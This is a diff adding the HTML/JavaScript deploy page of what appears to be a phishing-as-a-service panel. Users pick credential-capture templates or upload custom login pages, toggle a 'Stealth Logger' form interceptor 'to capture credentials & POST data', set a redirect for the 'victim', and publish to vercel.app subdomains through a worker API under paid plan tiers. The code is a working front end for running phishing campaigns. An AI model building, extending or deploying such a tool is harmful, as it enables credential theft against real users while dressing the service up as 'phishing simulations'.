@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="monetag" content="11fda623f808704a24728b96c85545b8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>D-TECH Hub | Secure Deploy</title>
+
+    <!-- Tailwind + Fonts -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    
+    <!-- CodeMirror (Custom HTML) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/material-ocean.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-deep: #03050b;
+            --bg-elevated: #0a0e1a;
+            --bg-card: #0f1322;
+            --border-glow: rgba(0, 112, 243, 0.3);
+            --accent-primary: #2b6ef0;
+            --accent-glow: #3b82f6;
+            --text-primary: #f0f3fa;
+            --text-secondary: #8a94b0;
+            --success: #10b981;
+            --danger: #ef4444;
+            --gold: #f5b042;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #070b14, #020409);
+            color: var(--text-primary);
+            min-height: 100vh;
+        }
+
+        /* Animated grid background */
+        .grid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(43, 110, 240, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(43, 110, 240, 0.05) 1px, transparent 1px);
+            background-size: 48px 48px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glass-panel {
+            background: rgba(15, 19, 34, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(43, 110, 240, 0.2);
+            border-radius: 1.75rem;
+            box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .input-modern {
+            background: #090c17;
+            border: 1px solid #1e243b;
+            transition: all 0.2s ease;
+            border-radius: 1rem;
+            padding: 0.75rem 1rem;
+            color: white;
+        }
+        .input-modern:focus {
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px rgba(43, 110, 240, 0.2);
+            outline: none;
+        }
+
+        /* Template Grid */
+        .template-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .template-card {
+            background: #0a0e1a;
+            border-radius: 1.25rem;
+            border: 1px solid #1e293b;
+            overflow: hidden;
+            transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            cursor: pointer;
+            position: relative;
+        }
+        .template-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--accent-primary);
+            box-shadow: 0 18px 30px -12px rgba(0, 112, 243, 0.25);
+        }
+        .template-card.selected {
+            border: 2px solid var(--accent-primary);
+            box-shadow: 0 0 0 1px rgba(43, 110, 240, 0.6), 0 12px 24px -12px #2b6ef0;
+        }
+        .template-card.disabled {
+            opacity: 0.65;
+            filter: grayscale(0.2);
+            cursor: not-allowed;
+        }
+        .template-card.disabled:hover {
+            transform: none;
+            border-color: #1e293b;
+        }
+
+        .preview-img-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16 / 10;
+            background: #00000040;
+            overflow: hidden;
+        }
+        .preview-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+        .template-card:hover .preview-img {
+            transform: scale(1.02);
+        }
+        .gold-badge, .locked-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: linear-gradient(135deg, #f5b042, #e98a2e);
+            color: #0a0a0a;
+            font-weight: bold;
+            font-size: 0.7rem;
+            padding: 4px 10px;
+            border-radius: 30px;
+            backdrop-filter: blur(4px);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+            letter-spacing: 0.5px;
+            z-index: 3;
+        }
+        .locked-badge {
+            background: #2d3748;
+            color: #b9c3e0;
+        }
+        .template-info {
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            background: rgba(10, 14, 26, 0.8);
+        }
+        .template-name {
+            font-weight: 700;
+            font-size: 1rem;
+            letter-spacing: -0.2px;
+        }
+        .preview-btn {
+            background: rgba(43, 110, 240, 0.15);
+            border: 1px solid rgba(43, 110, 240, 0.4);
+            padding: 0.3rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            transition: 0.2s;
+            color: #bdd3ff;
+        }
+        .preview-btn:hover {
+            background: #2b6ef0;
+            color: white;
+            border-color: #2b6ef0;
+        }
+
+        /* Toggle Switch Modern */
+        .mode-toggle {
+            background: rgba(5, 10, 22, 0.7);
+            border-radius: 2rem;
+            padding: 4px;
+            display: flex;
+            gap: 6px;
+            border: 1px solid #252f44;
+        }
+        .mode-option {
+            flex: 1;
+            text-align: center;
+            padding: 10px 0;
+            border-radius: 2rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #8a94b0;
+        }
+        .mode-option.active {
+            background: var(--accent-primary);
+            color: white;
+            box-shadow: 0 2px 8px rgba(43,110,240,0.4);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0e1a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2b6ef0;
+            border-radius: 10px;
+        }
+
+        .status-pill {
+            background: rgba(0,0,0,0.5);
+            border-radius: 40px;
+            font-size: 0.75rem;
+            padding: 0.25rem 0.8rem;
+        }
+        .btn-primary {
+            background: linear-gradient(105deg, #2b6ef0, #1a4fcf);
+            transition: all 0.2s;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 20px -12px #2b6ef0;
+            filter: brightness(1.05);
+        }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+    </style>
+
+<style>
+/* Spinner */
+.spinner {
+    border: 2px solid rgba(255, 255, 255, 0.1);
+    border-left-color: #ffffff;
+    border-radius: 50%;
+    width: 16px;
+    height: 16px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+    vertical-align: middle;
+    margin-right: 8px;
+}
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+/* Skeleton */
+.skeleton {
+    background: linear-gradient(90deg, rgba(255,255,255,0.05) 25%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0.05) 75%);
+    background-size: 200% 100%;
+    animation: skeleton-loading 1.5s infinite;
+    border-radius: 4px;
+}
+@keyframes skeleton-loading { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+</style>
+
+</head>
+<body class="relative">
+<div class="grid-bg"></div>
+
+<div class="relative z-10 max-w-6xl mx-auto px-4 py-6 md:py-10">
+    <!-- Header with tech vibe -->
+    <div class="flex flex-wrap justify-between items-center mb-8 pb-3 border-b border-white/10">
+        <div class="flex items-center gap-4">
+            <a href="dashboard.html" class="flex items-center gap-2 text-gray-400 hover:text-[#2b6ef0] transition-all font-medium text-sm bg-white/5 px-4 py-2 rounded-full">
+                <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
+                Dashboard
+            </a>
+            <a href="help.html" class="flex items-center gap-2 text-gray-400 hover:text-[#2b6ef0] transition-all font-medium text-sm bg-white/5 px-4 py-2 rounded-full">
+                <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                How to Use
+            </a>
+            <h1 class="text-2xl md:text-3xl font-bold tracking-tight bg-gradient-to-r from-white to-blue-400 bg-clip-text text-transparent">Deploy<span class="text-blue-500">.</span>io</h1>
+        </div>
+        <div class="text-xs font-mono text-gray-500 bg-black/30 px-3 py-1.5 rounded-full border border-white/5">SECURE CAPTURE NODE</div>
+    </div>
+
+    <!-- Main Card -->
+    <div class="glass-panel p-5 md:p-8">
+        <!-- Account usage indicator will be injected here via JS (dynamic) -->
+        <div id="dynamic-usage-area" class="mb-6"></div>
+
+        <!-- Mode Toggle (Template / Custom) -->
+        <div class="mode-toggle w-full max-w-sm mx-auto mb-8">
+            <div id="btn-mode-template" class="mode-option active" onclick="setMode('template')">📁 Use Template</div>
+            <div id="btn-mode-custom" class="mode-option" onclick="setMode('custom')">🛠️ Custom HTML</div>
+        </div>
+
+        <!-- TEMPLATE SECTION -->
+        <div id="section-template">
+            <div class="flex justify-between items-center mb-4">
+                <label class="text-sm font-semibold tracking-wide text-gray-300 uppercase flex items-center gap-2"><span class="w-2 h-2 bg-blue-500 rounded-full"></span> Premium Templates</label>
+                <span class="text-[11px] text-gray-500 bg-black/30 px-2 py-1 rounded-full">click to select</span>
+            </div>
+            <div id="templateGrid" class="template-grid min-h-[280px]">
+                <div class="col-span-full text-center py-12 text-gray-500">Loading tactical templates...</div>
+            </div>
+            <input type="hidden" id="selectedTemplateName">
+        </div>
+
+        <!-- CUSTOM HTML SECTION (hidden by default) -->
+        <div id="section-custom" class="hidden">
+            <div class="mb-5">
+                <label class="block text-sm font-semibold mb-2 text-gray-300">📄 Upload HTML / Code</label>
+                <input type="file" onchange="loadCustomFile(this)" accept=".html,.htm,.txt" class="block w-full text-sm text-gray-400 file:mr-3 file:py-2 file:px-5 file:rounded-full file:border-0 file:text-sm file:font-medium file:bg-blue-600/20 file:text-blue-400 hover:file:bg-blue-600/40 transition">
+            </div>
+            <div class="mb-5">
+                <textarea id="customHtml"></textarea>
+                <p class="text-xs text-gray-500 mt-2">✍️ Write raw HTML/CSS/JS. For phishing simulations & login pages.</p>
+            </div>
+            <div class="mb-5">
+                <label class="block text-sm font-semibold mb-2 text-gray-300">🎯 Redirect URL (Optional)</label>
+                <input type="text" id="customRedirectUrl" placeholder="https://example.com/dashboard" class="input-modern w-full">
+                <small class="text-gray-500 block mt-1 text-xs">After data capture, redirect victim. Leave empty for default success page.</small>
+            </div>
+            <div class="mb-5 flex items-start gap-3 p-4 bg-black/30 border border-blue-500/20 rounded-xl">
+                <input type="checkbox" id="enableInjector" class="mt-1 w-5 h-5 rounded border-gray-600 text-blue-500 focus:ring-blue-500 accent-blue-500">
+                <div>
+                    <span class="font-semibold text-sm block">🕵️ Stealth Logger + Data Capture</span>
+                    <small class="text-gray-400 text-xs">Injects the advanced form interceptor. Required to capture credentials & POST data.</small>
+                </div>
+            </div>
+        </div>
+
+        <!-- Subdomain & Deployment Section -->
+        <div class="mt-8 pt-6 border-t border-white/10">
+            <div id="template-direct-url-container" class="hidden mb-6 bg-blue-900/20 border border-blue-500/30 p-4 rounded-xl">
+                <label class="block text-xs font-semibold uppercase tracking-wide text-blue-300 mb-1">🔗 how the real URL looks like</label>
+                <a href="#" id="template-direct-url" target="_blank" class="text-blue-400 font-mono text-sm break-all hover:underline"></a>
+            </div>
+
+            <div class="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-sm font-semibold mb-2 text-gray-300">🌐 Subdomain (slug)</label>
+                    <input type="text" id="subdomain" maxlength="63" placeholder="secure-portal" oninput="updatePreview()" autocomplete="off" class="input-modern w-full font-mono">
+                    <div id="url-preview" class="mt-2 text-sm font-mono flex items-center gap-2 min-h-[28px]"></div>
+                </div>
+                <div>
+                    <label class="block text-sm font-semibold mb-2 text-gray-300"># Fragment (Optional)</label>
+                    <input type="text" id="fragment" placeholder="login" oninput="updatePreview()" autocomplete="off" class="input-modern w-full font-mono">
+                    <div id="fragment-preview" class="mt-2 text-sm font-mono flex items-center gap-2 min-h-[28px]"></div>
+                </div>
+            </div>
+
+            <div class="mb-6 bg-black/40 p-3 rounded-xl border border-white/10">
+                <label class="block text-xs font-semibold text-gray-400 mb-1 uppercase tracking-wide">Final URL Preview</label>
+                <div id="final-url-preview" class="text-blue-400 font-mono text-sm break-all">https://{subdomain}.vercel.app/#{fragment}</div>
+            </div>
+
+            <div class="mb-8 bg-black/30 rounded-xl p-4 border border-white/5">
+                <label class="block text-xs font-semibold uppercase tracking-wide text-gray-400">Master Key (Unique Code)</label>
+                <input type="text" id="uniqueCode" readonly class="w-full bg-transparent border-none text-white/70 font-mono text-sm outline-none cursor-default">
+            </div>
+
+            <button onclick="deploy()" id="deployBtn" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-lg tracking-wide transition-all disabled:opacity-50 disabled:translate-y-0 shadow-2xl">⚡ Deploy Site</button>
+            <div id="message" class="hidden mt-4 p-3 rounded-lg text-center"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Toast Notification -->
+<div id="toast" class="fixed bottom-6 right-6 z-[9999] bg-[#0f1322] border-l-4 border-blue-500 rounded-lg shadow-2xl px-5 py-3 text-white text-sm transition-all duration-300 translate-x-full opacity-0 pointer-events-none"></div>
+
+<!-- Unauthorized Modal -->
+<div id="unauthorized-modal" class="fixed inset-0 z-[10000] hidden flex items-center justify-center bg-black/60 backdrop-blur-sm">
+    <div class="bg-[#0f1322] border border-red-500/30 rounded-2xl p-6 max-w-sm w-full mx-4 shadow-2xl shadow-red-500/10">
+        <div class="flex items-center gap-4 mb-4">
+            <div class="w-12 h-12 rounded-full bg-red-500/10 flex items-center justify-center text-red-500 flex-shrink-0">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+            </div>
+            <div>
+                <h3 class="text-xl font-bold text-white">Unauthorized</h3>
+                <p class="text-sm text-gray-400">Session issue detected.</p>
+            </div>
+        </div>
+        <p class="text-gray-300 text-sm mb-6">
+            Authentication failed. This is often caused by residual data. Clear it now to fix the issue.
+        </p>
+        <div class="flex flex-col gap-3">
+            <button onclick="clearResidualData()" class="w-full px-4 py-3 rounded-xl bg-red-500 hover:bg-red-600 text-white transition-colors text-sm font-bold shadow-lg shadow-red-500/20">
+                Clear Residual Data & Log Out
+            </button>
+            <button onclick="document.getElementById('unauthorized-modal').classList.add('hidden')" class="w-full px-4 py-2 rounded-xl border border-gray-800 text-gray-400 hover:bg-white/5 transition-colors text-xs">
+                Ignore
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Success Modal -->
+<div id="success-modal" class="fixed inset-0 bg-black/80 backdrop-blur-md z-[10000] hidden justify-center items-center transition-all duration-300">
+    <div class="glass-panel p-6 max-w-md w-full mx-4 text-center transform transition-all">
+        <div class="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/30">
+            <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+        </div>
+        <h2 class="text-2xl font-bold mb-2">Deployed ✔️</h2>
+        <p class="text-gray-400 text-sm mb-5">Your capture interface is live on the edge network.</p>
+        <div class="bg-black/50 p-3 rounded-xl border border-gray-700 flex items-center justify-between gap-2 mb-6">
+            <a id="deployed-url" href="#" target="_blank" class="text-blue-400 font-mono text-sm truncate hover:underline">https://...</a>
+            <button onclick="copyDeployedUrl()" class="p-2 hover:bg-white/10 rounded-md transition"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg></button>
+        </div>
+        <div class="flex gap-3">
+            <a href="dashboard.html" class="flex-1 py-3 bg-[#0a0e1a] border border-gray-700 rounded-xl font-semibold hover:bg-white/5">Dashboard</a>
+            <button onclick="closeSuccessModal()" class="flex-1 py-3 bg-blue-600 rounded-xl font-semibold hover:bg-blue-700">Deploy Another</button>
+        </div>
+    </div>
+</div>
+
+<!-- Ad Overlay (free tier) -->
+<div id="ad-overlay" class="fixed inset-0 bg-black/90 backdrop-blur-lg z-[20000] hidden justify-center items-center flex-col text-center p-6" style="display: none;">
+    <div class="glass-panel max-w-md w-full p-8">
+        <h2 class="text-2xl font-bold text-blue-400 mb-3">🔒 Ad-Supported Deployment</h2>
+        <p class="text-gray-300 mb-6">To prevent abuse, free plan requires ad verification. Click below to unlock 1 deployment slot.</p>
+        <a href="https://otieu.com/4/10588053" target="_blank" onclick="unlockDeploy()" class="inline-block bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-xl font-bold w-full">👉 Unlock Deployment 👈</a>
+        <p class="text-xs text-gray-500 mt-5">*One-time verification per session</p>
+    </div>
+</div>
+
+<script>
+    // ---------- GLOBALS ----------
+    const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+    const ROOT_DOMAIN = 'secure-login.co.za';
+    let currentMode = 'template';
+    let isLimitReached = false;
+    let debounceTimer;
+    let userPlan = 'free';
+    let templatesMap = {};
+    let editor = null;
+
+    const userCode = localStorage.getItem('user_code');
+    if (!userCode) window.location.href = 'index.html';
+    else document.getElementById('uniqueCode').value = userCode;
+
+    // init CodeMirror
+    document.addEventListener('DOMContentLoaded', () => {
+            window.scrollTo(0, 0);
+        const textarea = document.getElementById('customHtml');
+        editor = CodeMirror.fromTextArea(textarea, {
+            mode: "htmlmixed",
+            theme: "material-ocean",
+            lineNumbers: true,
+            autoCloseTags: true,
+            matchBrackets: true,
+            lineWrapping: true
+        });
+        editor.setSize(null, 280);
+    });
+
+    // ---------- Load User Info (Plan, Limits) ----------
+    async function loadUserInfo() {
+        try {
+            const res = await fetch(`${WORKER_URL}/api/public/captures?code=${encodeURIComponent(userCode)}`);
+            const data = await res.json();
+            if (data.success) {
+                userPlan = data.plan || 'free';
+                document.body.setAttribute('data-plan', userPlan);
+                let limit = 1;
+                if (userPlan === 'basic') limit = 3;
+                if (userPlan === 'premium') limit = 10;
+                if (userPlan === 'gold') limit = 999;
+                const count = data.siteCount || 0;
+                const usageHtml = `
+                    <div class="flex flex-wrap justify-between items-center bg-black/40 rounded-2xl p-4 border border-white/10">
+                        <div>
+                            <span class="text-xs uppercase tracking-wider text-gray-400">Plan tier</span>
+                            <div class="text-xl font-bold mt-1 capitalize">${userPlan} ${userPlan === 'gold' ? '🏆' : (userPlan === 'premium' ? '💎' : '🌿')}</div>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-xs text-gray-400">Active Deployments</span>
+                            <div class="text-2xl font-mono font-bold"><span class="text-blue-400">${count}</span> <span class="text-gray-500 text-lg">/ ${limit}</span></div>
+                        </div>
+                        <div class="w-full mt-3 bg-gray-800 rounded-full h-1.5">
+                            <div class="bg-blue-500 h-1.5 rounded-full" style="width: ${Math.min((count/limit)*100,100)}%"></div>
+                        </div>
+                    </div>
+                `;
+                const usageDiv = document.getElementById('dynamic-usage-area');
+                if (usageDiv) usageDiv.innerHTML = usageHtml;
+                if (count >= limit) {
+                    isLimitReached = true;
+                    const btn = document.getElementById('deployBtn');
+                    btn.disabled = true;
+                    btn.innerText = "⛔ Limit Reached — Delete old site";
+                    showToast("Deployment limit reached. Please delete a site from dashboard.", "error");
+                } else {
+                    isLimitReached = false;
+                    const btn = document.getElementById('deployBtn');
+                    btn.disabled = false;
+                    btn.innerText = "⚡ Deploy Site";
+                }
+                if (userPlan === 'free') checkDeployAd();
+                loadTemplates(); // reload with lock status
+            }
+        } catch (e) { console.error(e); showToast("Failed to sync account", "error"); }
+    }
+
+    // ---------- Templates with Image Grid & Improved UI ----------
+    async function loadTemplates() {
+        const grid = document.getElementById('templateGrid');
+        if (!grid) return;
+        grid.innerHTML = `<div class="col-span-full text-center py-12 text-gray-400"><div class="animate-pulse">Loading advanced templates...</div></div>`;
+        try {
+            const res = await fetch(`${WORKER_URL}/api/public/templates`);
+            const data = await res.json();
+            if (!data.success || !data.data) throw new Error();
+            grid.innerHTML = '';
+            data.data.forEach(tmpl => {
+                const name = typeof tmpl === 'object' ? tmpl.name : tmpl;
+                const isGold = (typeof tmpl === 'object' && tmpl.isGoldOnly) || (name.includes("Gold") ? true : false);
+                const previewUrl = (typeof tmpl === 'object' && tmpl.previewUrl) ? tmpl.previewUrl : `https://placehold.co/600x400/111827/3b82f6?text=${encodeURIComponent(name)}+Preview`;
+                const redirectUrl = (typeof tmpl === 'object' && tmpl.redirectUrl) ? tmpl.redirectUrl : '';
+                const isLocked = (isGold && userPlan !== 'gold');
+                templatesMap[name] = { isGold, preview: previewUrl, redirectUrl };
+                
+                const card = document.createElement('div');
+                card.className = `template-card ${isLocked ? 'disabled' : ''}`;
+                if (!isLocked && !isLimitReached) card.onclick = () => selectTemplate(name, card);
+                else if (isLocked) card.onclick = (e) => { e.stopPropagation(); showToast("Gold Plan required to use this template", "error"); };
+                
+                card.innerHTML = `
+                    <div class="preview-img-container">
+                        <img class="preview-img" src="${previewUrl}" alt="${name}" loading="lazy" onerror="this.src='https://placehold.co/600x400/1e1e2f/5f6caf?text=Preview+Unavailable'">
+                        ${isGold ? '<div class="gold-badge">⭐ GOLD EXCLUSIVE</div>' : ''}
+                        ${isLocked && !isGold ? '<div class="locked-badge">🔒 LOCKED</div>' : ''}
+                    </div>
+                    <div class="template-info">
+                        <span class="template-name">${name}</span>
+                        <button class="preview-btn" onclick="event.stopPropagation(); openPreview('${name}')">👁 Preview</button>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+            if (data.data.length === 0) grid.innerHTML = '<div class="col-span-full text-center py-10">No templates available</div>';
+        } catch (err) {
+            grid.innerHTML = '<div class="col-span-full text-center py-10 text-red-400">⚠️ Failed to load templates</div>';
+        }
+    }
+
+    function selectTemplate(name, cardEl) {
+        if (isLimitReached) { showToast("Deployment limit exceeded", "error"); return; }
+        document.querySelectorAll('.template-card').forEach(c => c.classList.remove('selected'));
+        cardEl.classList.add('selected');
+        document.getElementById('selectedTemplateName').value = name;
+
+        const templateData = templatesMap[name];
+        const directUrlContainer = document.getElementById('template-direct-url-container');
+        const directUrlEl = document.getElementById('template-direct-url');
+
+        if (templateData && templateData.redirectUrl) {
+            directUrlEl.href = templateData.redirectUrl;
+            directUrlEl.innerText = templateData.redirectUrl;
+            directUrlContainer.classList.remove('hidden');
+        } else {
+            directUrlContainer.classList.add('hidden');
+        }
+
+        showToast(`Template "${name}" selected`, "success");
+    }
+
+    function openPreview(name) {
+        const url = `${WORKER_URL}/api/public/template-preview?name=${encodeURIComponent(name)}`;
+        window.open(url, '_blank');
+    }
+
+    // ---------- Mode Toggle ----------
+    function setMode(mode) {
+        currentMode = mode;
+        const templateBtn = document.getElementById('btn-mode-template');
+        const customBtn = document.getElementById('btn-mode-custom');
+        if (mode === 'template') {
+            templateBtn.classList.add('active');
+            customBtn.classList.remove('active');
+            document.getElementById('section-template').classList.remove('hidden');
+            document.getElementById('section-custom').classList.add('hidden');
+        } else {
+            customBtn.classList.add('active');
+            templateBtn.classList.remove('active');
+            document.getElementById('section-template').classList.add('hidden');
+            document.getElementById('section-custom').classList.remove('hidden');
+            setTimeout(() => editor?.refresh(), 80);
+        }
+    }
+
+    // ---------- Subdomain availability preview ----------
+    function updatePreview() {
+        const input = document.getElementById('subdomain');
+        const fragInput = document.getElementById('fragment');
+        const finalPreviewDiv = document.getElementById('final-url-preview');
+        const fragPreviewDiv = document.getElementById('fragment-preview');
+
+        let val = input.value.toLowerCase().replace(/[^a-z0-9-]/g, '-');
+        if (input.value !== val) input.value = val;
+        const sub = val.trim();
+        const frag = fragInput.value.trim();
+
+        // Update final visual preview
+        let displayUrl = `https://${sub || '{subdomain}'}.vercel.app`;
+        if (frag) {
+            displayUrl += `/#${frag}`;
+            fragPreviewDiv.innerHTML = `<span class="text-blue-400 font-mono">✔ Fragment added</span>`;
+        } else {
+            fragPreviewDiv.innerHTML = '';
+        }
+        finalPreviewDiv.innerText = displayUrl;
+
+        const previewDiv = document.getElementById('url-preview');
+        const btn = document.getElementById('deployBtn');
+        if (!sub) { previewDiv.innerHTML = ''; if(!isLimitReached) btn.disabled = false; return; }
+        previewDiv.innerHTML = `<span class="text-gray-400 animate-pulse text-xs">⟳ checking availability ...</span>`;
+        btn.disabled = true;
+        clearTimeout(debounceTimer);
+        debounceTimer = setTimeout(() => checkAvailability(sub), 500);
+    }
+
+    async function checkAvailability(sub) {
+        const previewDiv = document.getElementById('url-preview');
+        const btn = document.getElementById('deployBtn');
+        if (isLimitReached) return;
+
+        previewDiv.innerHTML = `<span class="text-gray-400 animate-pulse text-xs">⟳ checking availability ...</span>`;
+        btn.disabled = true;
+
+        try {
+            const res = await fetch(`${WORKER_URL}/api/public/check-subdomain?subdomain=${encodeURIComponent(sub)}&code=${encodeURIComponent(userCode)}`);
+            const data = await res.json();
+
+            if (data.success) {
+                if (data.available) {
+                    previewDiv.innerHTML = `<span class="text-blue-400 font-mono">Click Deploy to verify availability</span>`;
+                    btn.disabled = false;
+                } else if (data.ownedByYou) {
+                    previewDiv.innerHTML = `<span class="text-amber-400 font-mono">⚠ Your existing site — will overwrite</span>`;
+                    btn.disabled = false;
+                } else {
+                    previewDiv.innerHTML = `<span class="text-red-400 font-mono">✘ Not available</span>`;
+                    btn.disabled = true;
+                    const container = document.getElementById('toast-container');
+                    const existingToasts = container ? container.querySelectorAll('.custom-toast.error') : [];
+                    let hasTakenToast = false;
+                    existingToasts.forEach(t => {
+                        if (t.innerText.includes("Subdomain is not available")) {
+                            hasTakenToast = true;
+                        }
+                    });
+                    if (!hasTakenToast) {
+                        showToast("Subdomain is not available. Please choose another one.", "error");
+                    }
+                }
+            } else {
+                previewDiv.innerHTML = `<span class="text-yellow-500">error checking</span>`;
+                btn.disabled = true;
+            }
+        } catch (e) {
+            previewDiv.innerHTML = `<span class="text-yellow-500">network error</span>`;
+            btn.disabled = true;
+        }
+    }
+
+    // ---------- Deploy Function ----------
+    async function deploy() {
+        if (isLimitReached) { showToast("Deployment limit reached. Upgrade plan or delete sites.", "error"); return; }
+        const subdomain = document.getElementById('subdomain').value.trim();
+        if (!subdomain) { showToast("Enter a unique subdomain", "error"); return; }
+        const btn = document.getElementById('deployBtn');
+        btn.disabled = true;
+
+        let seconds = 0;
+        btn.innerText = `🚀 Deploying... (${seconds}s)`;
+        const deployInterval = setInterval(() => {
+            seconds++;
+            if (seconds < 5) {
+                btn.innerText = `📦 Preparing files... (${seconds}s)`;
+            } else if (seconds < 10) {
+                btn.innerText = `☁️ Pushing to Vercel... (${seconds}s)`;
+            } else {
+                btn.innerText = `⏳ Setting up alias... (${seconds}s)`;
+            }
+        }, 1000);
+
+        const payload = { subdomain, uniqueCode: userCode };
+        if (currentMode === 'template') {
+            const tmpl = document.getElementById('selectedTemplateName').value;
+            if (!tmpl) { showToast("Select a template first", "error"); btn.disabled = false; btn.innerText = "⚡ Deploy Site"; clearInterval(deployInterval); return; }
+            payload.templateName = tmpl;
+        } else {
+            const htmlContent = editor.getValue();
+            if (!htmlContent.trim()) { showToast("Custom HTML cannot be empty", "error"); btn.disabled = false; btn.innerText = "⚡ Deploy Site"; clearInterval(deployInterval); return; }
+            payload.customHtml = htmlContent;
+            payload.enableInjector = document.getElementById('enableInjector').checked;
+            payload.redirectUrl = document.getElementById('customRedirectUrl').value.trim();
+        }
+        const token = localStorage.getItem('session_token');
+        const headers = { 'Content-Type': 'application/json' };
+        if (token) headers['Authorization'] = `Bearer ${token}`;
+        try {
+            const res = await fetch(`${WORKER_URL}/api/public/deploy`, { method: 'POST', headers, body: JSON.stringify(payload) });
+            const data = await res.json();
+            clearInterval(deployInterval);
+            if (data.success) {
+                localStorage.removeItem('deploy_ad_pass');
+                const frag = document.getElementById('fragment').value.trim();
+                let finalUrl = data.url;
+                if (frag) {
+                    finalUrl += `/#${frag}`;
+                }
+                showSuccessModal(finalUrl);
+                btn.disabled = false;
+                btn.innerText = "⚡ Deploy Site";
+                loadUserInfo(); // refresh usage
+            } else {
+                showToast(data.error || "Deployment failed", "error");
+                btn.disabled = false;
+                btn.innerText = "⚡ Deploy Site";
+            }
+        } catch (err) {
+            clearInterval(deployInterval);
+            showToast("Network error: " + err.message, "error");
+            btn.disabled = false;
+            btn.innerText = "⚡ Deploy Site";
+        }
+    }
+
